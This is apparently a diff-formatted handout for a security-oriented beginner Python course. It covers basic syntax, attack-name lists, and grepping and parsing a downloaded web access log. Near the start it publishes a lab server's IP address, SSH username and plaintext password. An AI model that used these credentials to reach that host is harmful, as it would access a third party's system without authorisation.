+---------------------------Type This-----------------------------------
+ 
+sudo apt-get install -y idle
+ 
+-----------------------------------------------------------------------
+ 
+Open IDLE, and let's just dive right in.
+ 
+ 
+Here is the information to put into putty
+ 
+Host Name:          149.28.201.171
+protocol:           ssh
+port:               22
+username:           chfi
+password:           chfi!chfi123!
+ 
+ 
+If you are on a Mac (https://osxdaily.com/2017/04/28/howto-ssh-client-mac/)
+ 
+Open a terminal, then type:
+-------------------------------
+ssh -l chfi 149.28.201.171
+------------------------------   
+ 
+ 
+####################################
+# Python Lesson 1: Simple Printing #
+####################################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> print ("Today we are learning Python.")
+ 
+>>> exit()
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+############################################
+# Python Lesson 2: Simple Numbers and Math #
+############################################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> 2+2
+ 
+>>> 6-3
+ 
+>>> 18/7
+ 
+>>> 18.0/7
+ 
+>>> 18.0/7.0
+ 
+>>> 18/7
+ 
+>>> 9%4
+1
+>>> 8%4
+0
+>>> 8.75%.5
+ 
+>>> 6.*7
+ 
+>>> 7*7*7
+ 
+>>> 7**3
+ 
+>>> 5**12
+ 
+>>> -5**4
+ 
+>>> exit()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+##############################
+# Python Lesson 3: Variables #
+##############################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> x=18
+ 
+>>> x+15
+ 
+>>> x**3
+ 
+>>> y=54
+ 
+>>> g=int(input("Enter number here: "))
+Enter number here: 43
+>>> g
+ 
+>>> g+32
+ 
+>>> g**3
+ 
+>>> exit()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+##########################################
+# Python Lesson 4: Modules and Functions #
+##########################################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> 5**4
+ 
+>>> pow(5,4)
+ 
+>>> abs(-18)
+ 
+>>> abs(5)
+ 
+>>> floor(18.7)
+ 
+>>> import math
+ 
+>>> math.floor(18.7)
+ 
+>>> math.ceil(18.7)
+ 
+>>> math.sqrt(81)
+ 
+>>> joe = math.sqrt
+ 
+>>> joe(9)
+ 
+>>> joe=math.floor
+ 
+>>> joe(19.8)
+ 
+>>> exit()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+############################
+# Python Lesson 5: Strings #
+############################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> "XSS"
+ 
+>>> 'SQLi'
+ 
+>>> "Joe's a python lover"
+ 
+>>> "Joe said \"InfoSec is fun\" to me"
+ 
+>>> a = "Joe"
+ 
+>>> b = "McCray"
+ 
+>>> a, b
+ 
+>>> a+b
+ 
+>>> exit()
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#################################
+# Python Lesson 6: More Strings #
+#################################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> num = 10
+ 
+>>> num + 2
+ 
+>>> "The number of open ports found on this system is ",  num
+ 
+>>> num = str(18)
+ 
+>>> "There are ", num, " vulnerabilities found in this environment."
+ 
+>>> num2 = 46
+ 
+>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is ", + num2
+ 
+>>> exit()
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Lesson 7: Sequences and Lists #
+########################################
+ 
+---------------------------Type This-----------------------------------
+$ python3
+ 
+>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks
+['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks[3]
+'SQL Injection'
+ 
+>>> attacks[-2]
+'Cross-Site Scripting'
+ 
+>>> exit()
+ 
+ 
+ 
+------------------------------- Summary of fundamentals -------------------------------
+ 
+ 
+Joe rule #1 single quote, single quote, left arrow
+--------------------------------------------------
+'' <-- as soon as you type '', then hit your left arrow key to put you inside of the ''
+"" <-- as soon as you type "", then hit your left arrow key to put you inside of the ""
+something() <-- as soon as you type (), then hit your left arrow key to put you inside of the ()
+something[] <-- as soon as you type [], then hit your left arrow key to put you inside of the []
+something{} <-- as soon as you type {}, then hit your left arrow key to put you inside of the {}
+ 
+-- Now kick it up a notch
+[]  <-- as soon as you type [], then hit your left arrow key to put you inside of the []
+[()] <-- as soon as you type (), then hit your left arrow key to put you inside of the ()
+[({})] <-- as soon as you type {}, then hit your left arrow key to put you inside of the {}
+[({"''"})] <-- as soon as you type "", then hit your left arrow key to put you inside of the ""
+[({"''"})] <-- as soon as you type '', then hit your left arrow key to put you inside of the ''        
+ 
+ 
+ 
+Joe rule #2 "Code can only do 3 things"
+--------------------------------------
+ 
+Process     -   read, write, math
+ 
+Decision    -   if/then
+ 
+Loop        -   for
+ 
+ 
+ 
+ 
+Joe rule #3 "Never more than 5-10"
+---------------------------------
+ 
+-----5 lines of code----
+line 1 blah blah blah
+line 2 blah blah blah
+line 3 blah blah blah
+line 4 blah blah blah
+line 5 blah blah blah
+ 
+ 
+    sales_tax   =   price       *   tax_rate
+ 
+ 
+    0.80        =   10      *   0.08
+ 
+-----5-10 lines of code---- = function
+    price = 10
+   
+    def st():
+        sales_tax = price * 0.08
+        print(sales_tax)
+ 
+ 
+st(10) <---- how to run a function
+ 
+-----5-10 functions ---- = class   "tax class"
+st()
+lt()
+pt()
+it()
+dt()
+ 
+ 
+ 
+tax.st()
+tax.lt()
+ 
+-----5-10 functions ---- = class   "expense class"
+gas()
+elec()
+water()
+food()
+beer()
+ 
+expense.gas()
+ 
+ 
+-----5-10 classes ---- = module   "finance module"
+ 
+import finance
+ 
+ 
+------------------------------- Summary of fundamentals -------------------------------
+ 
+##################################
+# Lesson 8: Intro to Log Analysis #
+##################################
+ 
+ 
+Log into your Linux host then execute the following commands:
+-----------------------------------------------------------------------
+NOTE: If you are still in your python interpreter then you must type exit() to get back to a regular command-prompt.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/students/yourname
+ 
+wget http://pastebin.com/raw/85zZ5TZX
+ 
+mv 85zZ5TZX access_log
+ 
+ 
+cat access_log | grep 141.101.80.188
+ 
+cat access_log | grep 141.101.80.188 | wc -l
+ 
+cat access_log | grep 141.101.80.187
+ 
+cat access_log | grep 141.101.80.187 | wc -l
+ 
+cat access_log | grep 108.162.216.204
+ 
+cat access_log | grep 108.162.216.204 | wc -l
+ 
+cat access_log | grep 173.245.53.160
+ 
+cat access_log | grep 173.245.53.160 | wc -l
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###############################################################
+# Python Lesson 9: Use Python to read in a file line by line  #
+###############################################################
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+$ nano logread1.py
+ 
+ 
+---------------------------Paste This-----------------------------------
+## Open the file with read only permit
+f = open('access_log', "r")
+ 
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+ 
+print (lines)
+ 
+ 
+## close the file after reading the lines.
+f.close()
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 logread1.py
+----------------------------------------------------------------------
+ 
+ 
+ 
+Google the following:
+    - python difference between readlines and readline
+    - python readlines and readline
+ 
+ 
+Here is one student's solution - can you please explain each line of this code to me?
+ 
+ 
+---------------------------Type This-----------------------------------
+nano ip_search.py
+ 
+ 
+---------------------------Paste This-----------------------------------
+#!/usr/bin/env python3
+ 
+f = open('access_log')
+ 
+strUsrinput = input("Enter IP Address: ")
+ 
+for line in iter(f):
+  ip = line.split(" - ")[0]
+  if ip == strUsrinput:
+      print (line)
+ 
+f.close()
+ 
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 ip_search.py
+----------------------------------------------------------------------
+ 
+ 
+ 
+Working with another student after class we came up with another solution:
+ 
+---------------------------Type This-----------------------------------
+nano ip_search2.py
+ 
+---------------------------Paste This-----------------------------------
+#!/usr/bin/env python3
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+  if ip.find(userinput) != -1:
+      print (ip)
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+$ python3 ip_search2.py
+----------------------------------------------------------------------
